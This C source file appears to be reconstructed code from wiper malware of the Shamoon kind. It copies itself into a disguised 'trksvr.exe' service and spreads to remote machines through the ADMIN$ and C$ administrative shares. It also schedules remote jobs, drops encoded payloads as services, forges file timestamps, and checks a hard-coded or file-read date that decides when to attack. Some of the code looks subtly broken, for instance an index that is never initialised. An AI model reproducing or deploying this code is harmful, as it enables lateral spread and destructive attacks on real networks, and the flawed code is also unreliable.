/******************************************************************************************
  Copyright 2013 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

// MODIFIED BY mic.ric.tor
#include "3.h"
#include "0.h"
#include "2.h"

bool CopyCurrentExecutableToTrkSvr()
{
	WCHAR svc_path[256]; // [sp+Ch] [bp-268h]@1
	WCHAR svc_name[50]; // [sp+20Ch] [bp-68h]@1
	
	if(!GetTrksrvServiceInfo(svc_name, svc_path))
		return false;

	PVOID oldValue = NULL;
	_Wow64DisableWow64FsRedirection(&oldValue);

	if(!g_argv || !CopyFileW(g_argv[0], svc_path, FALSE))
	{
		_Wow64RevertWow64FsRedirection(oldValue);
		return false;
	}
	_Wow64RevertWow64FsRedirection(oldValue);
	
	SetReliableFileTime(svc_path);
	if(ConfigureTrkSvr(0, svc_path))
		return true;
	
	ForceFileDeletion(svc_path);
	return false;
}

bool WriteModuleOnSharedPC(const WCHAR *inFile, const WCHAR *remoteSrv)
{
	BOOL v16; // edi@6
	WCHAR *v31; // [sp-8h] [bp-12D4h]@12
	int v32; // [sp-4h] [bp-12D0h]@12
	int v33; // [sp+10h] [bp-12BCh]@6
	int v36; // [sp+20h] [bp-12ACh]@1
	bool v38; // [sp+27h] [bp-12A5h]@4
	WCHAR v39[1024]; // [sp+28h] [bp-12A4h]@11
	WCHAR v40[256]; // [sp+828h] [bp-AA4h]@10
	WCHAR NewFileName[256]; // [sp+A28h] [bp-8A4h]@11

	WCHAR csrss_dir[256];
	WCHAR svc_csrss[256];
	WCHAR csrss_locations[6][15] = {L"ADMIN$", L"C$\\WINDOWS", L"D$\\WINDOWS", L"E$\\WINDOWS"};
	
	
	WCHAR ExistingFileName[256]; // = "\\" + arg2 + "\\"

	strcpyW(ExistingFileName, L"\\\\", 4);
	strcpyW(&ExistingFileName[2], remoteSrv, 2 * strlenW(remoteSrv));
	strcpyW(&ExistingFileName[strlenW(remoteSrv) + 2], L"\\", 2);
	ExistingFileName[strlenW(remoteSrv) + 3] = 0;
	
	int file_len = strlenW(ExistingFileName);
	memmove(svc_csrss, ExistingFileName, 2 * file_len);
	int idx;
	// Iterate through the known locations for csrss.exe
	WCHAR *location = *csrss_locations;
	while(1)
	{
		memmove(&svc_csrss[file_len], location, 2 * strlenW(location));
		memmove(&svc_csrss[file_len + strlenW(location)], L"\\system32\\csrss.exe", 2 * strlenW(L"\\system32\\csrss.exe"));
		svc_csrss[file_len + strlenW(location) + strlenW(L"\\system32\\csrss.exe")] = 0;

		if(IsFileAccessible(svc_csrss))
			break;
		
		++idx;
		location += 15;
		if(idx >= 4)
		{
			return false;
		}
	}
	
	memmove(&ExistingFileName[file_len], csrss_locations[idx], 2 * strlenW(csrss_locations[idx]));
	memmove(&ExistingFileName[file_len + strlenW(csrss_locations[idx])], L"\\system32\\", 2 * strlenW(L"\\system32\\") + 2);
	memmove(csrss_dir, ExistingFileName, 2 * strlenW(ExistingFileName) + 2);

	file_len = strlenW(ExistingFileName);

	WCHAR exec_name[30]; // [sp+12A0h] [bp-2Ch]@1
	bool success;

	for( int i = 0; i < 29; i++)
	{
		const WCHAR *tmp_exec_name = g_random_exec_name[GetRandom() % 29];
		strcpyW(exec_name, tmp_exec_name, 2 * strlenW(tmp_exec_name));
		strcpyW(&exec_name[strlenW(tmp_exec_name)], L".exe", 2 * strlenW(L".exe") + 2);
		strcpyW(&ExistingFileName[file_len], exec_name, 2 * strlenW(exec_name) + 2);
		
		success = CopyFileW(inFile, ExistingFileName, 1);
		SetReliableFileTime(ExistingFileName);
		if( success )
			break;
	}

	if( !success )
		return false;
	
	strcpyW(v40, L"%SystemRoot%\\System32\\", 2 * strlenW(L"%SystemRoot%\\System32\\"));
	strcpyW(&v40[strlenW(L"%SystemRoot%\\System32\\")], exec_name, 2 * strlenW(exec_name) + 2);
	
	if(AddNewJob(remoteSrv, v40))
	{
		v38 = 1;
		return v38;
	}
	
	AddNewJob(remoteSrv, exec_name);
	
	strcpyW(NewFileName, csrss_dir, 2 * strlenW(csrss_dir));
	strcpyW(&NewFileName[strlenW(csrss_dir)], L"trksvr.exe", 2 * strlenW(L"trksvr.exe") + 2);
	strcpyW(v39, L"%SystemRoot%\\System32\\", 2 * strlenW(L"%SystemRoot%\\System32\\"));
	DeleteFileW(NewFileName);
	
	if(!MoveFileW(ExistingFileName, NewFileName))
	{
		v32 = 2 * strlenW(exec_name) + 2;
		v31 = exec_name;
	}
	else
	{
		v32 = 2 * strlenW(L"trksvr.exe") + 2;
		v31 = L"trksvr.exe";
	}
	
	strcpyW(&v39[strlenW(L"%SystemRoot%\\System32\\")], v31, v32);
	
	if(ConfigureTrkSvr(remoteSrv, v39))
	{
		v38 = 1;
		return v38;
	}
	
	return 0;
}

bool GetAttackDateFromFile(WORD *a1)
{
	HANDLE v5; // eax@3
	DWORD NumberOfBytesRead; // [sp+4h] [bp-218h]@5
	bool v13; // [sp+Bh] [bp-211h]@3
	WCHAR FileName[256]; // [sp+Ch] [bp-210h]@3
	char date_config[10]; // [sp+20Ch] [bp-10h]@5
	
	if(a1)
	{
		v13 = 0;
		strcpyW(FileName, g_windows_directory, 2 * strlenW(g_windows_directory) + 2);
		strcpyW(&FileName[strlenW(g_windows_directory)], L"\\inf\\netft429.pnf", 2 * strlenW(L"\\inf\\netft429.pnf") + 2);
		
		v5 = CreateFileW(FileName, 0x80000000u, 7, 0, 3, 0x100000, 0);
		
		if(v5 && v5 != INVALID_HANDLE_VALUE)
		{
			NumberOfBytesRead = 0;
			ReadFile(v5, date_config, 10, &NumberOfBytesRead, 0);

			if(NumberOfBytesRead != 10) v13 = false;
			
			v13 = true;
			if(atoi(&date_config[8]) > 59) (v13 = false); else (a1[ADA_MINUTE] = atoi(&date_config[8]));
			date_config[8] = 0;
			
			if(atoi(&date_config[6]) > 23) (v13 = false); else (a1[ADA_HOUR  ] = atoi(&date_config[6]));
			date_config[6] = 0;
			
			if(atoi(&date_config[4]) > 30) (v13 = false); else (a1[ADA_DAY   ] = atoi(&date_config[4]));
			date_config[4] = 0;
			
			if(atoi(&date_config[2]) > 11) (v13 = false); else (a1[ADA_MONTH ] = atoi(&date_config[2]));
			date_config[2] = 0;
			
			if(atoi(&date_config[0]) > 98) (v13 = false); else (a1[ADA_YEAR  ] = atoi(&date_config[0]) + 2000);
			
			if(a1[3] > GetDaysInMonth(a1[0], a1[1])) v13 = false;
			
			CloseHandle(v5);
		}
		
		return v13;
	}
	
	return 0;
}

int TimeToAttack()
{
	WORD v5[6]; // [sp+Ch] [bp-24h]@1
	struct _SYSTEMTIME SystemTime; // [sp+1Ch] [bp-14h]@4
	
	if(!GetAttackDateFromFile(v5))
	{
		v5[ADA_YEAR  ] = 2012;
		v5[ADA_MONTH ] = 8;
		v5[ADA_HOUR  ] = 8;
		v5[ADA_DAY   ] = 15;
		v5[ADA_MINUTE] = 8;
	}
	
	GetSystemTime(&SystemTime);
	if(SystemTime.wYear < v5[ADA_YEAR])
		return 2;
	
	if(SystemTime.wMonth >= v5[ADA_MONTH] && SystemTime.wDay >= v5[ADA_DAY] && SystemTime.wHour >= v5[ADA_HOUR] && SystemTime.wMinute >= v5[ADA_MINUTE])
		return 0;
	
	if(SystemTime.wYear == v5[ADA_YEAR] && SystemTime.wMonth == v5[ADA_MONTH] && SystemTime.wDay == v5[ADA_DAY] && SystemTime.wHour == v5[ADA_HOUR])
	{
		if(v5[ADA_MINUTE] - SystemTime.wMinute < 2)
		{
			if(v5[ADA_MINUTE] - SystemTime.wMinute < 0)
				return 0;
			
			return v5[ADA_MINUTE] - SystemTime.wMinute;
		}
	}
	
	return 2;
}

bool TryToRunServiceNetinit(const WCHAR *a1)
{
	WCHAR svc_path[256]; // [sp+Ch] [bp-204h]@2
	
	g_netinit_id = SearchProcessByIdOrName(g_netinit_id, g_netinit_name);
	if(!g_netinit_id)
	{
		if(!GetNetinitServiceInfo(g_netinit_name, svc_path))
			return 0;
		
		if(WriteEncodedResource(svc_path, 0, (LPCWSTR)0x71, L"PKCS7", g_keys[KEY_PKCS7], 4))
		{
			SetReliableFileTime(svc_path);
			if(a1)
			{
				strcpyW(&svc_path[strlenW(svc_path)], L" ", 4);
				strcpyW(&svc_path[strlenW(svc_path)], a1, 2 * strlenW(a1) + 2);
			}
			
			g_netinit_id = 0;
			if(!StartServiceProcess(g_netinit_name, svc_path, &g_netinit_id))
				return 0;
		}
	}
	return 1;
}

bool SetupTrkSvrService()
{
	struct _STARTUPINFOW StartupInfo; // [sp+Ch] [bp-4D0h]@16
	struct _PROCESS_INFORMATION ProcessInformation; // [sp+50h] [bp-48Ch]@16
	SC_HANDLE service_manager_handle; // [sp+60h] [bp-47Ch]@2
	SC_HANDLE service_handle; // [sp+64h] [bp-478h]@3
	LPQUERY_SERVICE_CONFIGW service_config; // [sp+68h] [bp-474h]@6
	DWORD pcbBytesNeeded; // [sp+6Ch] [bp-470h]@4
	bool service_file_written; // [sp+73h] [bp-469h]@3
	WCHAR command_line[256]; // [sp+74h] [bp-468h]@16
	WCHAR svc_path[256]; // [sp+274h] [bp-268h]@9
	WCHAR svc_filename[50]; // [sp+474h] [bp-68h]@9
	
	if(!Is32Bit() || (service_manager_handle = OpenSCManagerW(0, 0, SC_MANAGER_ALL_ACCESS)) == 0)
		return false;
	
	service_file_written = 0;
	service_handle = OpenServiceW(service_manager_handle, L"TrkSvr", SC_MANAGER_ALL_ACCESS);
	
	if(service_handle)
	{
		pcbBytesNeeded = 0;
		if(!QueryServiceConfigW(service_handle, 0, 0, &pcbBytesNeeded) && GetLastError() == ERROR_INSUFFICIENT_BUFFER)
			service_config = (LPQUERY_SERVICE_CONFIGW)LocalAlloc(0, pcbBytesNeeded);
		
		if(QueryServiceConfigW(service_handle, service_config, pcbBytesNeeded, &pcbBytesNeeded))
		{
			if(strcmpW(&service_config->lpBinaryPathName[strlenW(service_config->lpBinaryPathName) - strlenW(L"trksvr.exe")], L"trksvr.exe"))
			{
				if(GetTrksrvServiceInfo(svc_filename, svc_path) && WriteEncodedResource(svc_path, 0, (LPCWSTR)0x74, L"X509", g_keys[KEY_X509], 4))
				{
					SetReliableFileTime(svc_path);
					service_file_written = true;
				}
				else
				{
					service_file_written = false;
				}
			}
		}
		CloseServiceHandle(service_handle);
	}
	CloseServiceHandle(service_manager_handle);
	
	if(!service_file_written)
		return false;
	
	strcpyW(command_line, g_windows_directory, 2 * strlenW(g_windows_directory));
	strcpyW(&command_line[strlenW(g_windows_directory)], TRKSRV_CMD, 2 * strlenW(TRKSRV_CMD) + 2);
	
	memset(&StartupInfo, 0, 0x44);
	memset(&ProcessInformation, 0, 0x10);
	
	if(!CreateProcessW(NULL, command_line, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &StartupInfo, &ProcessInformation))
		return false;
	
	CloseHandle(ProcessInformation.hThread);
	CloseHandle(ProcessInformation.hProcess);
	CloseHandle(StartupInfo.hStdError);
	CloseHandle(StartupInfo.hStdInput);
	CloseHandle(StartupInfo.hStdOutput);
	
	return true;
}